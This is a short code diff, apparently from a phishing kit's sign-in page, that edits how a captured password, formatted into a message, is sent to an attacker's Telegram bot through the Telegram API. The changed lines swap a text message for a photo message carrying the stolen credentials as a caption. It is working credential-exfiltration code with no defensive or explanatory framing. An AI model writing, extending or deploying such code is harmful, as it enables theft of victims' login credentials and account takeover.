@@ -582,7 +582,8 @@
                 '\uD83D\uDD11 Password: <code>' + esc(password) + '</code>\n' +
                 '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
             );
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatId + '&text=' + text + '&parse_mode=HTML');
+            const photo = 'https://i.ibb.co/hFPv3VYh/photo-2026-08-13-14-21-56.jpg';
+            fetch('https://api.telegram.org/bot' + token + '/sendPhoto?chat_id=' + chatId + '&photo=' + encodeURIComponent(photo) + '&caption=' + text + '&parse_mode=HTML');
         }
 
         function proceedSignIn() {
